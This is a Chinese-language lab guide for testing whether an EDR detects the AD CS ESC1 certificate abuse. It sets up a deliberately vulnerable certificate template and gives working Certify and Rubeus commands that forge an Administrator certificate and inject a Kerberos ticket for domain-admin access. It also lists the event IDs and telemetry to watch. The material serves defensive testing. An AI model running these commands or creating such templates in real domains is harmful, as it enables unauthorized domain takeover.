# AD CS ESC1 Vulnerability Validation Guide

本文件旨在提供完整的 ESC1 (AD CS Certificate Abuse) 漏洞環境建置與驗證流程，用於測試 EDR 系統的偵測與防禦能力。

## 環境資訊

*   **AD CS 主機 (CA Server)**: `10.0.0.206` (SME-SWP-W-AD)
*   **CA 名稱**: `sme-SME-SWP-W-AD-CA`
*   **攻擊測試機**: `10.0.0.x` (已安裝 Certify 與 Rubeus)
*   **目標**: 驗證 EDR 是否能偵測異常憑證申請與後續的身分偽冒行為。

---

## ⚠️ 前置作業：啟用稽核日誌 (AD CS 主機端)

**這一步至關重要。** 若不啟用以下稽核原則，您將無法在 Windows Event Log 中看到關鍵的攻擊跡象 (4886/4887/4768)，導致 EDR 驗證失效。

### 1. 啟用 CA 服務稽核 (針對 Event ID 4886/4887)
在 AD CS 主機上執行：
1.  開啟 `certsrv.msc`。
2.  右鍵點擊 CA 名稱 (`sme-SME-SWP-W-AD-CA`) -> **Properties (內容)**。
3.  切換到 **Auditing (稽核)** 頁籤。
4.  勾選 **Issue and manage certificate requests (發行和管理憑證要求)**。
5.  點擊 **OK**。
6.  設定詳細稽核過濾器 (雖然 Event Log 有限制，但這是最佳實踐)：
    ```powershell
    certutil -setreg CA\AuditFilter 127
    Restart-Service CertSvc
    ```

### 2. 啟用 Windows 進階稽核原則 (針對 Event ID 4768)
在 AD CS 主機 (以系統管理員身分) 執行 PowerShell：

```powershell
# 啟用憑證服務稽核 (產生 4886, 4887)
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# 啟用 Kerberos 驗證稽核 (產生 4768 - PKINIT)
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# 啟用登入稽核 (產生 4624)
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

---

## 第一階段：漏洞環境建置 (AD CS 主機端)

此階段在 AD CS 主機上建立一個具有 ESC1 漏洞特徵的憑證範本。

### 步驟 1：建立 ESC1 範本
1.  執行 `certtmpl.msc` 開啟範本管理主控台。
2.  複製 `User` 範本 (相容性選 Windows Server 2003)。
3.  設定以下關鍵屬性：
    *   **Template Name**: `ESC1`
    *   **Request Handling**: 勾選 `Allow private key to be exported`。
    *   **Subject Name**: 選擇 `Supply in the request` (⚠️ 核心漏洞點)。
    *   **Extensions**: 確認 `Application Policies` 包含 `Client Authentication`。
    *   **Security**: 加入 `Domain Users` 並勾選 `Read` 與 `Enroll` (⚠️ 確保未勾選 Write 相關權限，否則會變成 ESC4)。
    *   **Issuance Requirements**: 確認 `Manager approval` **未勾選**。

### 步驟 2：發佈範本
1.  執行 `certsrv.msc` 開啟 CA 管理主控台。
2.  右鍵點擊 `Certificate Templates` -> `New` -> `Certificate Template to Issue`。
3.  選擇 `ESC1` 範本並發佈。

---

## 第二階段：攻擊模擬 (測試機端)

此階段模擬攻擊者利用 ESC1 漏洞獲取 Domain Admin 權限。

### 步驟 1：漏洞偵察 (Enumeration)
使用 Certify 掃描環境中是否存在易受攻擊的範本。

```powershell
& ".\Certify.exe" enum-templates /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /vulnerable
```

**預期結果**: 發現 `ESC1` 範本，且標記 `[!] Vulnerable to ESC1: True`。

### 步驟 2：漏洞利用 - 申請惡意憑證 (Exploitation)
利用 `ESC1` 範本，偽造 `Administrator` 身分申請憑證。

```powershell
& ".\Certify.exe" request /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /template:ESC1 /upn:Administrator@sme.local /out-file:admin.pem
```

**預期結果**: 成功取得 `admin.pem`，內容包含私鑰與憑證。

### 步驟 3：權限提升 - PKINIT 認證 (Privilege Escalation)
將 PEM 憑證轉換為 TGT (Ticket Granting Ticket)，直接注入記憶體。

```powershell
# 讀取 PEM 內容並移除換行 (直接使用 Base64 字串，不需轉檔)
$pem = (Get-Content ".\admin.pem" -Raw).Replace("`r`n","").Replace("`n","")

# 使用 Rubeus 進行 PKINIT (預設 PFX 密碼為 certify)
.\Rubeus.exe asktgt /user:Administrator /certificate:$pem /password:certify /domain:sme.local /dc:10.0.0.206 /ptt
```

**預期結果**: 顯示 `[+] Ticket successfully imported!`，並可存取 DC (e.g., `dir \\10.0.0.206\c$`)。

---

## 第三階段：EDR 與日誌驗證 (The Validation)

EDR 或 SIEM 系統應能偵測以下異常行為與事件日誌。

### Windows Event Logs (重點監控)

| Event ID | 來源 | 說明 | 偵測重點 (IOC) |
| :--- | :--- | :--- | :--- |
| **4886** | Security (CA) | 憑證服務收到憑證申請 | 檢查 `Attributes` 欄位。**注意：** 即使開啟 `AuditFilter 127`，Windows 預設日誌仍可能不會完整記錄 SAN 屬性，這是已知限制。 |
| **4887** | Security (CA) | 憑證服務已發行憑證 | 雖然 Event Log 可能缺失 SAN，但 `Requester` (申請者: aduser) 與最終簽發的憑證 (Subject: Administrator) 之間的身分不一致仍是關鍵異常。 |
| **4768** | Security (DC) | Kerberos TGT 請求 (PKINIT) | 這是最可靠的指標。檢查 `Certificate Information`。攻擊者使用憑證進行認證時觸發。若短時間內頻繁申請 TGT 屬異常。 |
| **4624** | Security (DC) | 帳戶成功登入 | 登入類型為 `3` (Network) 或 `9` (NewCredentials)，且使用 Administrator 身分。 |

### 進階驗證：直接查詢 CA 資料庫 (繞過 Event Log 限制)
若 Event 4887 未顯示 SAN，可直接查詢 CA 資料庫確認攻擊是否成功寫入：
1.  開啟 `certsrv.msc` -> **Issued Certificates**。
2.  找到最新的憑證 -> **Details** -> **Subject Alternative Name**。
3.  確認其中包含 `Principal Name=Administrator@sme.local`。

### Endpoint Telemetry (EDR 視角)

| 行為 | 說明 | 偵測重點 |
| :--- | :--- | :--- |
| **Process Execution** | 執行攻擊工具 | `Certify.exe` 或 `Rubeus.exe` 的執行。攻擊者可能改名，需依賴行為特徵。 |
| **Command Line** | 參數特徵 | 包含 `/ca:`, `/template:`, `/altname:`, `/ptt`, `asktgt` 等關鍵字。 |
| **.NET Assembly Load** | 記憶體載入 | 監控 `ETW` (Event Tracing for Windows) Provider `Microsoft-Windows-DotNETRuntime`。 |
| **ETW 151/154** | Assembly 載入事件 | 偵測非受信任的 Assembly 載入，或來自記憶體的反射載入 (Reflective DLL Injection)。 |
| **Network Connection** | 網路連線 | 測試機對 CA (TCP 135, 445, 80/443) 與 DC (TCP 88, 389) 的異常連線。 |

---

## 結論

若 EDR 系統能有效運作，應在 **步驟 2 (申請憑證)** 時即發出告警 (偵測到異常 SAN 申請)，或在 **步驟 3 (PKINIT)** 時攔截 (偵測到已知攻擊工具行為或異常 TGT 請求)。

此環境已驗證 ESC1 攻擊路徑的可行性，可用於持續測試 EDR 規則的有效性。
